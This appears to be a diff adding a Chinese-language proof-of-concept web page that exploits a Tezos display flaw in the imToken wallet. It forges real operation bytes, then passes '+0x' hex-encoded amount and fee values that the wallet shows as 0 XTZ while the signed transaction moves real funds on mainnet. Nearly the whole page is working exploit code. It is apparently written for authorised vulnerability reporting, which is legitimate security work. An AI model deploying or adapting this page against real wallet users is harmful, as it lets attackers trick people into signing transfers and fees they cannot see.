@@ -1,0 +1,636 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Tezos Number Canonicalization PoC</title>
+    <style>
+      :root {
+        color-scheme: light;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        background: #f6f8fb;
+        color: #172033;
+      }
+      body {
+        margin: 0;
+        padding: 18px;
+      }
+      main {
+        max-width: 820px;
+        margin: 0 auto;
+        background: #fff;
+        border: 1px solid #e5e8ef;
+        border-radius: 8px;
+        padding: 18px;
+        box-shadow: 0 8px 30px rgba(23, 32, 51, 0.08);
+      }
+      h1 {
+        margin: 0 0 10px;
+        font-size: 22px;
+      }
+      h2 {
+        margin: 22px 0 8px;
+        font-size: 16px;
+      }
+      p {
+        line-height: 1.55;
+      }
+      label {
+        display: block;
+        margin: 14px 0 6px;
+        font-weight: 600;
+      }
+      input {
+        box-sizing: border-box;
+        width: 100%;
+        border: 1px solid #cdd5e1;
+        border-radius: 6px;
+        padding: 11px 12px;
+        font: inherit;
+      }
+      button {
+        width: 100%;
+        margin-top: 12px;
+        border: 0;
+        border-radius: 6px;
+        padding: 12px 14px;
+        background: #1769ff;
+        color: #fff;
+        font-weight: 700;
+        font-size: 15px;
+      }
+      button.secondary {
+        background: #334155;
+      }
+      button:disabled {
+        background: #9aa8bd;
+      }
+      code {
+        background: #eef2f7;
+        border-radius: 4px;
+        padding: 1px 4px;
+      }
+      pre {
+        white-space: pre-wrap;
+        word-break: break-word;
+        min-height: 220px;
+        margin-top: 16px;
+        border-radius: 6px;
+        background: #111827;
+        color: #d1fae5;
+        padding: 14px;
+        font-size: 12px;
+        line-height: 1.45;
+      }
+      .warn {
+        border-left: 4px solid #ff9f1a;
+        background: #fff8eb;
+        padding: 10px 12px;
+        border-radius: 6px;
+      }
+      .row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-top: 14px;
+      }
+      .row input {
+        width: auto;
+      }
+      .grid {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 10px;
+      }
+      @media (min-width: 720px) {
+        .grid {
+          grid-template-columns: 1fr 1fr;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <h1>Tezos 数值 canonicalization 所见不所签 PoC</h1>
+      <p class="warn">
+        仅用于授权测试。页面会调用 <code>tezos.sendTransaction</code>，
+        钱包确认后会尝试广播真实 Tezos 交易。建议使用测试钱包或极小金额。
+      </p>
+      <p>
+        复现点：先用十进制字段生成真实 <code>operationBytes</code>，再把
+        <code>input</code> 中的 <code>amount</code> 或 <code>fee</code>
+        改成 Tezos RPC/Taquito 同样接受的 <code>+0x...</code> 写法。PR 的
+        re-forge 校验会通过，但 app 展示转换会把它兜底成 <code>0</code>。
+      </p>
+
+      <label for="source">当前钱包 Tezos 地址 source</label>
+      <input id="source" placeholder="运行时自动读取" autocomplete="off" readonly />
+
+      <label for="to">实际收款地址 destination，可留空自动使用 source</label>
+      <input id="to" placeholder="tz1... / tz2... / tz3..." autocomplete="off" />
+
+      <label for="amount">实际转账金额，单位 mutez</label>
+      <input id="amount" value="1" inputmode="numeric" />
+
+      <label for="fee">实际手续费，单位 mutez</label>
+      <input id="fee" value="1420" inputmode="numeric" />
+
+      <div class="row">
+        <input id="ack" type="checkbox" />
+        <span>我确认使用测试账户或极小金额，并理解点击确认会尝试真实签名/广播。</span>
+      </div>
+
+      <h2>链上 PoC</h2>
+      <div class="grid">
+        <button id="runAmount" disabled>
+          生成 PoC A：amount 用 +0x
+        </button>
+        <button id="runFee" disabled>
+          生成 PoC B：fee 用 +0x
+        </button>
+      </div>
+      <button id="runBoth" class="secondary" disabled>
+        生成 PoC C：amount 和 fee 都用 +0x
+      </button>
+      <button id="sendPrepared" disabled>
+        发送已生成 payload，打开钱包确认页
+      </button>
+      <button id="loadSaved" class="secondary">
+        载入最近保存的 payload
+      </button>
+      <button id="resetRun" class="secondary">
+        重置页面按钮状态
+      </button>
+
+      <h2>本地解析自检</h2>
+      <button id="runLocal" class="secondary">
+        显示 Number()/toBN 对 NaN 和精度的影响
+      </button>
+
+      <pre id="log">等待执行...</pre>
+    </main>
+
+    <script>
+      const $ = (id) => document.getElementById(id)
+      const logEl = $("log")
+      const ack = $("ack")
+      const guardedButtons = [$("runAmount"), $("runFee"), $("runBoth")]
+      const sendPreparedButton = $("sendPrepared")
+      const SAVED_PAYLOAD_KEY = "tezos-number-canonicalization-payload"
+      let signFlowSubmitted = false
+      let preparedPayload = null
+      let preparedImToken = null
+
+      function log(message, data) {
+        const text =
+          data === undefined
+            ? message
+            : `${message}\n${JSON.stringify(data, null, 2)}`
+        logEl.textContent += `\n\n${text}`
+        logEl.scrollTop = logEl.scrollHeight
+      }
+
+      function resetLog(title) {
+        logEl.textContent = title
+      }
+
+      function setRunning(running) {
+        guardedButtons.forEach((button) => {
+          button.disabled = running || signFlowSubmitted || !ack.checked
+        })
+        sendPreparedButton.disabled =
+          running || signFlowSubmitted || !ack.checked || !preparedPayload
+      }
+
+      function sleep(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms))
+      }
+
+      function savePreparedPayload(payload) {
+        const data = {
+          payload,
+          savedAt: new Date().toISOString(),
+          href: location.href,
+        }
+        localStorage.setItem(SAVED_PAYLOAD_KEY, JSON.stringify(data))
+        log("payload 已保存到 localStorage。若钱包队列卡死，可重启 imToken 后回到本页直接载入发送。", data)
+      }
+
+      function loadSavedPayload(silent) {
+        const text = localStorage.getItem(SAVED_PAYLOAD_KEY)
+        if (!text) {
+          if (!silent) log("没有找到已保存的 payload")
+          return false
+        }
+        try {
+          const data = JSON.parse(text)
+          if (!data || !data.payload || !data.payload.operationBytes) {
+            throw new Error("保存内容缺少 operationBytes")
+          }
+          preparedPayload = data.payload
+          preparedImToken = null
+          if (!silent) {
+            log("已载入最近保存的 payload：", data)
+            log("提示：Tezos branch 有时效，建议生成后几分钟内验证；如果签名/广播时报 branch 相关错误，请重新生成 payload。")
+          }
+          setRunning(false)
+          return true
+        } catch (err) {
+          localStorage.removeItem(SAVED_PAYLOAD_KEY)
+          if (!silent) {
+            log(`已保存 payload 无法解析，已清除：${err && err.message ? err.message : err}`)
+          }
+          return false
+        }
+      }
+
+      function hasFunction(value) {
+        return typeof value === "function"
+      }
+
+      function getImToken() {
+        if (!window.imToken || !window.imToken.callAPI) {
+          throw new Error("未检测到 imToken 注入对象，请在钱包 DApp 浏览器中打开本页")
+        }
+        return window.imToken
+      }
+
+      function callImTokenAPI(imToken, apiName, payload, ms) {
+        return new Promise((resolve, reject) => {
+          const timer = setTimeout(
+            () => reject(new Error(`${apiName} 超时 ${ms}ms`)),
+            ms
+          )
+          imToken.callAPI(apiName, payload || {}, (err, result) => {
+            clearTimeout(timer)
+            if (err) {
+              const error = new Error(
+                typeof err === "string"
+                  ? err
+                  : err.message || JSON.stringify(err)
+              )
+              error.raw = err
+              error.code = err && err.code
+              reject(error)
+            } else {
+              resolve(result)
+            }
+          })
+        })
+      }
+
+      function isQueueLimitError(err) {
+        const message = err && err.message ? err.message : String(err)
+        return /Exceed the task queue limit/i.test(message)
+      }
+
+      function buildTezosSendHint(err) {
+        const message = err && err.message ? err.message : String(err)
+        if (isQueueLimitError(err)) {
+          return `${message}。这是钱包 SignFlow 单任务队列仍被占用，不是本 PoC 的 forge mismatch。请先关闭/取消钱包里残留的签名弹窗，等待 3 秒，或刷新 DApp 页面后只点击一次 PoC 按钮。`
+        }
+        if (/unrevealed key/i.test(message)) {
+          return `${message}。当前 Tezos 账户还没有 reveal public key，请换一个已做过 Tezos 转账/委托的账户，或先用原生钱包完成一次 reveal。`
+        }
+        return message
+      }
+
+      async function sendTransactionWithQueueRetry(imToken, payload) {
+        log("5.1 等待 1.2 秒，让 makeBytes 的 bridge 回调和 native 状态落稳")
+        await sleep(1200)
+        signFlowSubmitted = true
+        try {
+          return await callImTokenAPI(
+            imToken,
+            "tezos.sendTransaction",
+            payload,
+            60000
+          )
+        } catch (err) {
+          if (!isQueueLimitError(err)) throw err
+          log(
+            "第一次 sendTransaction 命中 SignFlow 队列限制，等待 2.5 秒后自动重试一次。"
+          )
+          await sleep(2500)
+          return await callImTokenAPI(
+            imToken,
+            "tezos.sendTransaction",
+            payload,
+            60000
+          )
+        }
+      }
+
+      function detectNativeTransport(targetWindow) {
+        const w = targetWindow || window
+        if (
+          w.ReactNativeWebView &&
+          hasFunction(w.ReactNativeWebView.postMessage)
+        ) {
+          return "ReactNativeWebView.postMessage"
+        }
+        if (
+          w.webkit &&
+          w.webkit.messageHandlers &&
+          w.webkit.messageHandlers.reactNative &&
+          hasFunction(w.webkit.messageHandlers.reactNative.postMessage)
+        ) {
+          return "webkit.messageHandlers.reactNative.postMessage"
+        }
+        if (
+          w.__REACT_WEB_VIEW_BRIDGE &&
+          hasFunction(w.__REACT_WEB_VIEW_BRIDGE.postMessage)
+        ) {
+          return "__REACT_WEB_VIEW_BRIDGE.postMessage"
+        }
+        return "window.postMessage fallback"
+      }
+
+      function logBridgeDiagnostics(imToken) {
+        let topFrame = {}
+        try {
+          topFrame = {
+            readable: true,
+            sameObject: window.top.imToken === window.imToken,
+            hasPostMessage:
+              !!window.top.imToken && hasFunction(window.top.imToken.postMessage),
+            transport: detectNativeTransport(window.top),
+          }
+        } catch (err) {
+          topFrame = {
+            readable: false,
+            error: err && err.message ? err.message : String(err),
+          }
+        }
+        log("bridge 环境诊断：", {
+          href: location.href,
+          isTopFrame: window === window.top,
+          imTokenVersion: imToken.version,
+          messageIdBeforeCall: imToken._messageId,
+          currentFrameTransport: detectNativeTransport(window),
+          topFrame,
+        })
+      }
+
+      function normalizeAccount(account) {
+        if (typeof account === "string") return account
+        if (account && typeof account.address === "string") return account.address
+        if (account && typeof account.address === "object") {
+          return account.address.address || account.address.value
+        }
+        return ""
+      }
+
+      async function readCurrentTezosSource(imToken) {
+        log("1. 调用 tezos.getAccounts 读取当前 Tezos 账户")
+        const accounts = await callImTokenAPI(
+          imToken,
+          "tezos.getAccounts",
+          {},
+          10000
+        )
+        log("tezos.getAccounts 返回：", accounts)
+        const list = Array.isArray(accounts) ? accounts : [accounts]
+        const source = list
+          .map(normalizeAccount)
+          .find((item) => /^tz[1-3]/.test(item))
+        if (!source) {
+          throw new Error("tezos.getAccounts 未返回可用的 tz1/tz2/tz3 地址")
+        }
+        $("source").value = source
+        return source
+      }
+
+      function assertDecimalNatural(name, value) {
+        if (!/^(0|[1-9][0-9]*)$/.test(value)) {
+          throw new Error(`${name} 必须是十进制非负整数字符串`)
+        }
+      }
+
+      function decimalToPlusHex(value) {
+        return `+0x${BigInt(value).toString(16)}`
+      }
+
+      function tezosDisplayToBNFallback(value) {
+        const num = Number(value)
+        if (Array.isArray(value)) return "0"
+        if (Number.isNaN(num)) return "0"
+        if (Number.isNaN(Number.parseFloat(value))) return "0"
+        if (!Number.isFinite(num)) return "0"
+        return String(num)
+      }
+
+      function buildTransferOperation(source, destination, amount, fee) {
+        return {
+          kind: "transaction",
+          source,
+          destination,
+          amount: String(amount),
+          fee: String(fee),
+          gas_limit: "10600",
+          storage_limit: "300",
+        }
+      }
+
+      function getPrimaryTransactionOperation(operations) {
+        return operations.find((operation) => operation.kind === "transaction")
+      }
+
+      function mutateOperations(operations, mode, amount, fee) {
+        return operations.map((operation) => {
+          if (operation.kind !== "transaction") return operation
+          const next = { ...operation }
+          if (mode === "amount" || mode === "both") {
+            next.amount = decimalToPlusHex(amount)
+          }
+          if (mode === "fee" || mode === "both") {
+            next.fee = decimalToPlusHex(fee)
+          }
+          return next
+        })
+      }
+
+      function describeExpectedDisplay(mode, amount, fee) {
+        const amountInput =
+          mode === "amount" || mode === "both" ? decimalToPlusHex(amount) : amount
+        const feeInput = mode === "fee" || mode === "both" ? decimalToPlusHex(fee) : fee
+        const prTotalFee = `${Number("0") + Number(feeInput)}`
+        return {
+          actualSignedAmountMutez: amount,
+          actualSignedAmountXTZ: `${Number(amount) / 1000000}`,
+          inputAmountSentToWallet: amountInput,
+          walletAmountDisplayByCurrentToBNPath:
+            tezosDisplayToBNFallback(amountInput) === "0"
+              ? "0 XTZ"
+              : `${Number(amountInput) / 1000000} XTZ`,
+          actualSignedFeeMutez: fee,
+          inputFeeSentToWallet: feeInput,
+          prTotalFee,
+          walletFeeDisplayByCurrentToBNPath:
+            tezosDisplayToBNFallback(Number(prTotalFee)) === "0"
+              ? "0 XTZ"
+              : `${Number(prTotalFee) / 1000000} XTZ`,
+        }
+      }
+
+      async function preparePoc(mode) {
+        resetLog(`开始生成 ${mode} PoC payload...`)
+        setRunning(true)
+        try {
+          const imToken = getImToken()
+          preparedImToken = imToken
+          logBridgeDiagnostics(imToken)
+
+          log("0. DApp bridge 预检：调用 device.getCurrentLanguage")
+          const language = await callImTokenAPI(
+            imToken,
+            "device.getCurrentLanguage",
+            {},
+            5000
+          )
+          log("device.getCurrentLanguage 返回：", language)
+
+          const source = await readCurrentTezosSource(imToken)
+          let destination = $("to").value.trim()
+          const amount = $("amount").value.trim()
+          const fee = $("fee").value.trim()
+          assertDecimalNatural("amount", amount)
+          assertDecimalNatural("fee", fee)
+          if (!destination) {
+            destination = source
+            $("to").value = source
+            log("destination 为空，自动使用 source 做自转账测试")
+          }
+          if (!/^tz[1-3]/.test(destination)) {
+            throw new Error("destination 必须是 tz1/tz2/tz3 地址")
+          }
+
+          const decimalOperation = buildTransferOperation(
+            source,
+            destination,
+            amount,
+            fee
+          )
+          log("2. 用十进制 operation 调用 tezos.makeBytes：", decimalOperation)
+          const forged = await callImTokenAPI(
+            imToken,
+            "tezos.makeBytes",
+            [decimalOperation],
+            30000
+          )
+          log("tezos.makeBytes 返回：", forged)
+
+          const operationBytes = forged.bytes
+          const forgedOperations = forged.operations || [decimalOperation]
+          if (!operationBytes) throw new Error("makeBytes 未返回 bytes")
+
+          const mutatedInput = mutateOperations(
+            forgedOperations,
+            mode,
+            amount,
+            fee
+          )
+          log("3. 等价替换后的 input。PR 会拿这个 input 重新 forge：", mutatedInput)
+          log("4. 预期展示差异：", describeExpectedDisplay(mode, amount, fee))
+
+          const payload = {
+            from: source,
+            chainId: "NetXdQprcVkpaWU",
+            caip2: "tezos:NetXdQprcVkpaWU",
+            input: mutatedInput,
+            operationBytes,
+            gasLimit:
+              getPrimaryTransactionOperation(mutatedInput)?.gas_limit || "10600",
+            storageLimit:
+              getPrimaryTransactionOperation(mutatedInput)?.storage_limit || "300",
+            messages: [
+              {
+                type: "amount",
+                value: "DApp fake message ignored by PR",
+              },
+            ],
+            messageHeader: {
+              name: "transaction",
+              fee: "DApp fake header ignored by PR",
+            },
+          }
+          log("5. 传给 tezos.sendTransaction 的 payload：", payload)
+          log(
+            "payload 已生成。建议等待 2-3 秒后点击“发送已生成 payload”，观察钱包确认页。"
+          )
+          preparedPayload = payload
+          savePreparedPayload(payload)
+        } catch (err) {
+          log(`PoC 中止/失败：${buildTezosSendHint(err)}`)
+        } finally {
+          setRunning(false)
+        }
+      }
+
+      async function sendPreparedPayload() {
+        setRunning(true)
+        try {
+          const imToken = preparedImToken || getImToken()
+          if (!preparedPayload) {
+            throw new Error("还没有生成 payload，请先点击 PoC A/B/C 生成")
+          }
+          log("6. 开始调用 tezos.sendTransaction。")
+          log(
+            "现在观察钱包确认页：如果 amount 或 fee 显示为 0，但 payload/operationBytes 代表非零数值，则复现成功。取消签名即可。"
+          )
+          const result = await sendTransactionWithQueueRetry(
+            imToken,
+            preparedPayload
+          )
+          log("tezos.sendTransaction 返回：", result)
+        } catch (err) {
+          log(`PoC 中止/失败：${buildTezosSendHint(err)}`)
+        } finally {
+          setRunning(false)
+        }
+      }
+
+      function runLocalProof() {
+        resetLog("本地解析自检")
+        const amount = $("amount").value.trim() || "1000000"
+        const fee = $("fee").value.trim() || "1420"
+        const amountPlusHex = /^(0|[1-9][0-9]*)$/.test(amount)
+          ? decimalToPlusHex(amount)
+          : "+0xF4240"
+        const feePlusHex = /^(0|[1-9][0-9]*)$/.test(fee)
+          ? decimalToPlusHex(fee)
+          : "+0x58c"
+        const huge = "9007199254740993"
+        log("当前 JS/仓库展示路径的关键行为：", {
+          amountPlusHex,
+          Number_amountPlusHex: String(Number(amountPlusHex)),
+          currentToBNFallback_amount: tezosDisplayToBNFallback(amountPlusHex),
+          feePlusHex,
+          prTotalFeeWithPlusHex: `${Number("0") + Number(feePlusHex)}`,
+          currentToBNFallback_fee:
+            tezosDisplayToBNFallback(`${Number("0") + Number(feePlusHex)}`),
+          hugeFee: huge,
+          Number_hugeFee: String(Number(huge)),
+          NumberPrecisionLost: String(Number(huge)) !== huge,
+        })
+      }
+
+      ack.addEventListener("change", () => setRunning(false))
+      $("resetRun").addEventListener("click", () => {
+        signFlowSubmitted = false
+        preparedPayload = null
+        preparedImToken = null
+        setRunning(false)
+        log("已重置页面按钮状态，localStorage 中保存的 payload 未删除。如果钱包仍提示队列限制，请关闭残留签名弹窗或重启 imToken。")
+      })
+      $("loadSaved").addEventListener("click", () => loadSavedPayload(false))
+      $("runAmount").addEventListener("click", () => preparePoc("amount"))
+      $("runFee").addEventListener("click", () => preparePoc("fee"))
+      $("runBoth").addEventListener("click", () => preparePoc("both"))
+      $("sendPrepared").addEventListener("click", sendPreparedPayload)
+      $("runLocal").addEventListener("click", runLocalProof)
+      loadSavedPayload(true)
+    </script>
+  </body>
+</html>
